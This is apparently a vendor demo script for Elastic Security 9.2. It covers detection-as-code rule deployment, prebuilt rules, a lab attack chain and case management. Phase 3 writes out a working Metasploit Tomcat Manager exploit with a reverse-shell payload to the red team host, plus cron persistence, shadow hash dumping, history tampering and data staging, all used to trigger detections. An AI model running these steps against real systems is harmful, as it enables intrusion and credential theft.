# Elastic Security Demo 
# Elastic 9.2 - Detection Engineering, Attack Chain, and Case Management
# Last Updated: November 2025

################################################################################
# PREREQUISITES
################################################################################

# Blue Team VM: Ubuntu 20.04 with Tomcat 9.0.30 (weak credentials: tomcat/tomcat)
# Red Team VM: Ubuntu 22.04+ with Metasploit, Python 3, detection-rules repo
# Elastic: 9.2+ with Elastic Agent on target, configured Kibana connection

# IPs for this demo:
RED_TEAM_IP="10.0.1.100"    # Replace with your red team VM private IP
BLUE_TEAM_IP="10.0.1.50"    # Replace with your blue team VM private IP

################################################################################
# PHASE 1: DETECTION AS CODE WORKFLOW
# Goal: Create, test, and deploy custom detection rule using GitOps workflow
################################################################################

## Step 1: Create Rule in Local Kibana (ec-local)

# Open Local Kibana in browser

# Navigate to: Security → Rules → Detection rules (SIEM)
# Click: "Create new rule"

# Rule Type: Event Correlation (EQL)

# Configure using metadata from: demo-script/tomcat-webshell-rule-metadata.md
# - Name: Tomcat Manager Web Shell Deployment
# - Description: An interactive shell seems to have been spawned by Tomact. 
# - Severity: High
# - Risk Score: 73
# - Index Pattern: logs-endpoint.events.*

# EQL Query: Copy from demo-script/tomcat-webshell-rule-query.eql
# Paste the query into the query builder

# Add Tags:
# - Domain: Endpoint
# - OS: Linux
# - Use Case: Threat Detection
# - Tactic: Execution
# - Data Source: Elastic Defend

# Configure Schedule:
# - Runs every: 1 minutes
# - Additional look-back time: 9 minutes (from = "now-9m")



# MITRE ATT&CK Mapping:
# - T1190: Exploit Public-Facing Application
# - T1505.003: Web Shell

# Save and enable the rule

## Step 2: Export Rule Using detection-rules CLI

# On local machine (with detection-rules installed):
cd ../security-demo-detection-rules

# First, source environment variables
# Note: The .env-detection-rules file was automatically created during 'terraform apply'
../security-demo-2025/scripts/setup-detection-rules.sh
source ../security-demo-2025/scripts/.env-detection-rules

# Export the rule:
python -m detection_rules kibana --cloud-id="${LOCAL_CLOUD_ID}" --api-key="${LOCAL_API_KEY}" export-rules --rule-id "50052ec2-ae29-48b7-a897-4e349c9bb2d3" --directory custom-rules/rules/ --strip-version

# This creates: custom-rules/rules/tomcat_webshell_detection.toml

## Step 3: Test Rule Locally

# Validate rule syntax:
python -m detection_rules test custom-rules/rules/tomcat_webshell_detection.toml
# Expected: ✓ Rule validation successful

# View rule details:
python -m detection_rules view-rule custom-rules/rules/tomcat_webshell_detection.toml

## Step 4: Commit and Push to Feature Branch

# Create feature branch:
git checkout -b feature/tomcat-webshell-detection

# Add the rule:
git add . 

# Commit with descriptive message:
git commit -m "feat: Add Tomcat web shell detection rule

# Push to remote:
git push origin feature/tomcat-webshell-detection

When creating a PR, look for the dropdown at the top that says:
base repository: elastic/detection-rules  ← Change this!
base: main

## Step 5: Pull Request Auto-Created

# GitHub Actions automatically creates a PR to dev branch
# Check GitHub repository in browser to see the PR
# PR includes:
# - Checklist for review
# - Automatic validation results

## Step 6: Review and Approve PR

# In GitHub UI:
# 1. Navigate to Pull Requests tab
# 2. Click on auto-created PR
# 3. Review the rule changes
# 4. Check that validation passed (green checkmark)
# 5. Approve the PR
# 6. Click "Merge pull request"
# 7. Confirm merge

## Step 7: Automatic Deployment to Dev Kibana

# GitHub Actions automatically deploys the rule to Development environment (ec-dev)
# Monitor deployment: GitHub → Actions tab → "Deploy to Development" workflow
#
# When workflow completes:
# - Rule is deployed to Dev Kibana (ec-dev)
# - Rule is enabled and ready to detect attacks

# Verify deployment:
# Open Dev Kibana: [ec-dev Kibana URL from terraform output]
# Navigate to: Security → Rules → Search "Tomcat Manager"
# The rule should be present and enabled

################################################################################
# PHASE 2: ENABLE OOTB DETECTION RULES IN DEV KIBANA
# Duration: 2-3 minutes
# Goal: Activate prebuilt rules for comprehensive coverage
################################################################################

## Step 8: Add OOTB Rules in Dev Kibana (ec-dev)

# Open Dev Kibana in browser:
# URL: [ec-dev Kibana URL from terraform output]
# Login: elastic / [password from terraform output elastic_dev_password]

# In Elastic Security UI:
# 1. Navigate to: Security → Rules → Detection rules (SIEM)
# 2. Filter: Status = "Disabled", Tags contains "Linux"
# 3. Enable these rules (bulk select):
#    ☑ Potential SYN-Based Port Scan Detected
#    ☑ Potential Reverse Shell via Java  
#    ☑ Linux System Information Discovery via Getconf
#    ☑ Sudo Command Enumeration Detected
#    ☑ Cron Job Created or Modified 
#    ☑ Potential Shadow File Read via Command Line Utilities 
#    ☑ Tampering of Shell Command-Line History
#    ☑ Sensitive Files Compression
#   
# 4. Bulk actions → Enable
# 5. View MITRE ATT&CK coverage map

# Note: These OOTB rules complement the custom Tomcat rule deployed via GitOps

################################################################################
# PHASE 3: EXECUTE ATTACK CHAIN
# Duration: 8-10 minutes
# Goal: Trigger detections across multiple MITRE stages
################################################################################

## 3.0 - Reconnaissance (Reconnaissance - T1046)
# TCP port scan to identify open services
nmap -sT -p 22,80,443,8080,8443 --open $BLUE_TEAM_IP

# Detection: "Potential SYN-Based Port Scan Detected" (OOTB rule)

## 3.1 - Start Metasploit with pre-configured exploit
msfconsole -r ~/elastic_demo.rc

# Resource script contains:
# use exploit/multi/http/tomcat_mgr_upload
# set RHOSTS BLUE_TEAM_IP
# set HttpUsername tomcat
# set HttpPassword tomcat
# set LHOST RED_TEAM_IP
# set payload java/meterpreter/reverse_tcp

## 3.2 - Verify configuration
show options

## 3.3 - Execute exploit (Initial Access - T1190)
exploit

# Wait for session to open
# Expected output:
# [*] Started reverse TCP handler on RED_TEAM_IP:4444
# [*] Uploading payload...
# [*] Sending stage to BLUE_TEAM_IP
# [*] Meterpreter session 1 opened

## 3.4 - Basic system information
sysinfo
getuid

# Detection: "Tomcat Manager Web Shell Deployment" (custom rule)
# Detection: "Potential Reverse Shell via Java" (OOTB rule)

## 3.5 - Discovery commands (Discovery - T1082, T1033)
shell

whoami
id
uname -a
hostname
cat /etc/passwd | grep -v nologin

# Enumerate system configuration using getconf
getconf -a
getconf LONG_BIT
getconf PAGE_SIZE

exit

# Detection: "Linux System Information Discovery via Getconf" (OOTB rule)

## 3.6 - Privilege escalation (Privilege Escalation - T1548)
shell

# Enumerate sudo permissions
sudo -l
sudo -V

# Escalate to root
sudo /bin/bash
whoami    # Should show 'root'

exit

# Detection: "Sudo Command Enumeration Detected" (OOTB rule)

## 3.7 - Establish persistence (Persistence - T1053.003)
background

use exploit/linux/local/persistence_cron
set SESSION 1
set LHOST $RED_TEAM_IP
set LPORT 4445
run

# Detection: "Cron Job Created or Modified" (OOTB rule)

## 3.8 - Credential dumping (Credential Access - T1003.008)
use post/linux/gather/hashdump
set SESSION 1
run

# Detection: "Potential Shadow File Read via Command Line Utilities" (OOTB rule)

## 3.9 - View collected credentials
loot
creds

## 3.10 - Defense evasion (Defense Evasion - T1070.003)
sessions -i 1
shell

unset HISTFILE
export HISTSIZE=0
history -c

exit

# Detection: "Tampering of Shell Command-Line History" (OOTB rule)

## 3.11 - Data staging (Collection - T1074.001)
shell

# Stage sensitive files in hidden directory
mkdir /tmp/.staging
find /home -name "*.pdf" -exec cp {} /tmp/.staging/ \; 2>/dev/null
find /home -name "*.doc*" -exec cp {} /tmp/.staging/ \; 2>/dev/null
find /etc -name "*.conf" -exec cp {} /tmp/.staging/ \; 2>/dev/null

# Compress staged data for exfiltration
tar -czf /tmp/data.tar.gz /tmp/.staging
zip -r /tmp/backup.zip /tmp/.staging 2>/dev/null

exit

# Detection: "Sensitive Files Compression" (OOTB rule)

## 3.12 - View MITRE ATT&CK coverage
# In Elastic UI: Navigate to Alerts → MITRE ATT&CK view
# Shows detected techniques across the kill chain

################################################################################
# PHASE 4: CASE MANAGEMENT (ELASTIC 9.2 FEATURES)
# Duration: 10-12 minutes
# Goal: Demonstrate investigation workflow with new 9.2 capabilities
################################################################################

## 4.1 - Create case from alerts
# In Elastic Security UI:
# 1. Navigate to: Alerts
# 2. Select multiple alerts:
#    ☑ Tomcat Manager Web Shell Deployment
#    ☑ Potential Reverse Shell via Java
#    ☑ Linux System Information Discovery via Getconf
#    ☑ Sudo Command Enumeration Detected
#    ☑ Cron Job Created or Modified
#    ☑ Potential Shadow File Read via Command Line Utilities
#    ☑ Tampering of Shell Command-Line History
#    ☑ Sensitive Files Compression
# 3. Click: "Add to case" → "Create new case"

## 4.2 - Fill case details
# Title: Linux Server Compromise - Tomcat Exploitation
# Severity: High
# Description:
"""
## Incident Summary
Multiple alerts triggered indicating successful compromise of Tomcat server 
via weak credentials. Attack progressed through multiple MITRE ATT&CK stages 
including initial access, persistence, and credential theft.

## Initial Indicators
- Weak Tomcat Manager credentials exploited (tomcat/tomcat)
- Web shell deployed via WAR file
- Meterpreter session established
- Privilege escalation to root
- Persistent backdoor installed via cron
- Password hashes exfiltrated
"""

# Tags: tomcat, webshell, linux, compromise, credential-theft
# Category: Security Incident
# 
# ⚠️ NEW in 9.2: Auto-extract observables (checkbox - enabled by default)
# This automatically extracts IPs, hostnames, processes, file paths, users

## 4.3 - Explore case features

# Case ID: Note the human-readable ID (e.g., Case #0007)
# NEW in 9.2: Human-readable case IDs replace UUIDs

## 4.4 - Review auto-extracted observables
# Click: "Observables" tab
# 
# NEW in 9.2: Observables auto-extracted from alerts:
# - IP Addresses: 192.168.1.10 (blue team), 192.168.1.100 (red team)
# - Hostnames: ubuntu-tomcat-01
# - Processes: java, bash, crontab, sudo
# - File Paths: /opt/tomcat/webapps/shell.war, /etc/shadow, crontab paths
# - User Accounts: tomcat, root
#
# Toggle: "Auto-extract observables" - can be disabled per case

## 4.5 - Add custom observable
# Click: "Add observable"
# Type: Custom (NEW in 9.2 - custom observable types)
# Value: CVE-2020-1938
# Description: Potential Ghostcat vulnerability

## 4.6 - Build investigation timeline
# Click: "Activity" tab
# Click: "Add to timeline"
# Select key alerts to add to timeline
# Timeline shows process tree, network connections, file modifications

## 4.7 - Add investigation notes
# Click: "Add comment"

"""
## Investigation Steps Completed

### 1. Initial Analysis (15:30 UTC)
- Confirmed Tomcat Manager exploitation via weak credentials
- Web shell deployed: /opt/tomcat/webapps/shell.war
- Meterpreter session established from 192.168.1.100

### 2. Scope Assessment (15:35 UTC)
- Single host affected: ubuntu-tomcat-01
- Privilege escalation to root confirmed
- Persistence via cron job (callback every 15 minutes)
- Password hashes accessed from /etc/shadow

### 3. Containment Actions (15:40 UTC)
- ✅ Network isolation completed
- ✅ Malicious processes terminated
- ✅ Cron persistence removed
- ✅ User passwords reset

### 4. Eradication (15:50 UTC)
- ✅ Web shell removed
- ✅ Tomcat credentials changed
- ✅ System patched to latest version
- ✅ Enhanced monitoring deployed

### 5. Recovery (16:00 UTC)
- ✅ Service restored
- ✅ Additional detection rules deployed
- ✅ Network segmentation implemented
"""

## 4.8 - Add visualization (optional)
# Click: "Visualization" button
# Create new visualization: "Attack Timeline by MITRE Tactic"
# Chart type: Bar chart showing alerts over time grouped by tactic
# Add to case

## 4.9 - Review case metrics
# Case Summary shows:
# - Total alerts: 6
# - Associated users: 2 (tomcat, root)
# - Associated hosts: 1 (ubuntu-tomcat-01)
# - Total connectors: 0
#
# Observables count:
# - Total extracted: 12+
# - IP Addresses: 2
# - Hostnames: 1
# - Processes: 4
# - File Paths: 3
# - User Accounts: 2
# - Custom: 1

## 4.10 - Close case
# Add final comment:

"""
## Resolution Summary

All containment and remediation actions completed:
✅ Host isolated and rebuilt
✅ All passwords rotated across environment
✅ Tomcat patched to version 9.0.93
✅ Manager credentials changed to strong random password
✅ Network segmentation - Tomcat Manager now internal-only
✅ Enhanced monitoring rules deployed

## Response Metrics
- Time to detection: <1 minute
- Time to case creation: 3 minutes
- Time to containment: 15 minutes
- Total case duration: 45 minutes

## Lessons Learned
1. Default/weak credentials remain critical vulnerability
2. Detection rules covered all attack stages (100% visibility)
3. Auto-extract observables saved ~10 minutes in triage
4. Human-readable case IDs improved team communication

## Follow-up Actions
- Security awareness training on credential management
- Automated credential auditing implementation
- Quarterly penetration testing scheduled

Status: Closed - Resolved
"""

# Change status: Closed

################################################################################
# POST-DEMO CLEANUP
################################################################################

## Clean up Metasploit sessions
sessions -K
exit

## Clean up blue team VM (SSH to blue team)
# ssh ubuntu@$BLUE_TEAM_IP
# sudo systemctl stop tomcat
# sudo rm -rf /opt/tomcat/webapps/shell*
# crontab -r
# sudo systemctl start tomcat

################################################################################
# VERIFICATION COMMANDS
################################################################################

## Test connectivity before demo
ping $BLUE_TEAM_IP
curl http://$BLUE_TEAM_IP:8080
curl -u tomcat:tomcat http://$BLUE_TEAM_IP:8080/manager/text/list

## Verify Metasploit database
sudo msfdb status

## Verify detection-rules CLI
cd ~/security-demo-detection-rules
source ../.venv/bin/activate  # Or wherever you installed detection-rules
python -m detection_rules --help

## Check Elastic Agent on blue team VM
# ssh ubuntu@$BLUE_TEAM_IP
# sudo systemctl status elastic-agent

################################################################################
# RECOVERY COMMANDS (if things go wrong)
################################################################################

## If Metasploit session dies
sessions -l                  # List sessions
sessions -i 1                # Reconnect to session 1
exploit                      # Re-exploit if needed

## If rule deployment fails
# Check GitHub Actions workflow status:
# GitHub → Actions tab → Check "Deploy to Development" workflow

# If workflow failed, you can manually deploy:
cd ~/security-demo-detection-rules
source ../.venv/bin/activate
python -m detection_rules kibana \
  --cloud-id="[DEV_CLOUD_ID from terraform output]" \
  --api-key="[Create API key in Dev Kibana]" \
  import-rules -d custom-rules/rules/

## If connectivity fails
ping $BLUE_TEAM_IP
nc -zv $BLUE_TEAM_IP 8080
# Check security groups in AWS
# Verify blue team Tomcat is running

################################################################################
# DEMO SUMMARY
################################################################################

# Phase 1: Detection as Code Workflow (GitOps)
#   - Created custom rule in Local Kibana UI (ec-local)
#   - Exported rule using detection-rules CLI
#   - Tested locally with detection-rules framework
#   - Committed to feature branch
#   - Automatic PR creation to dev branch
#   - PR validation and approval
#   - Automatic deployment to Dev Kibana (ec-dev)
#   - Demonstrated complete GitOps workflow

# Phase 2: OOTB Rules
#   - Enabled 6+ prebuilt Linux detection rules in Dev Kibana
#   - Showed MITRE ATT&CK coverage map
#   - Demonstrated comprehensive detection library

# Phase 3: Attack Execution
#   - Exploited Tomcat Manager with weak credentials
#   - Progressed through 7+ MITRE stages
#   - Triggered detections across entire kill chain
#   - Demonstrated complete visibility

# Phase 4: Case Management (9.2 Features)
#   - Created case from multiple alerts
#   - NEW: Human-readable case IDs (Case #0007 vs UUID)
#   - NEW: Auto-extracted observables from alerts
#   - NEW: Custom observable types
#   - Documented complete investigation
#   - Closed case with metrics and lessons learned

################################################################################
# NOTES
################################################################################

# Total Demo Time: 32-40 minutes
# - Detection as Code Workflow (GitOps): 12-15 min
# - Enable OOTB Rules: 2-3 min
# - Attack Chain: 8-10 min
# - Case Management: 10-12 min

# Key Differentiators:
# - Detection as Code with GitOps (version control, testing, PR workflow, CI/CD)
# - Dual environment approach (Local for dev, Dev for testing)
# - Automated PR creation and deployment
# - 2000+ prebuilt rules (all open source)
# - Complete MITRE ATT&CK coverage
# - Elastic 9.2 case enhancements
# - Single platform (detection → investigation → response)

# Customer Value:
# - Faster detection engineering with GitOps workflow
# - Code review process for detection rules (quality assurance)
# - Reduced false positives with tested, peer-reviewed rules
# - Automated deployment reduces manual errors
# - Improved analyst efficiency (auto-extract observables)
# - Better team communication (human-readable case IDs)
# - Complete investigation documentation for compliance
# - Separation of dev/test environments prevents production impact

################################################################################
# END OF SCRIPT
################################################################################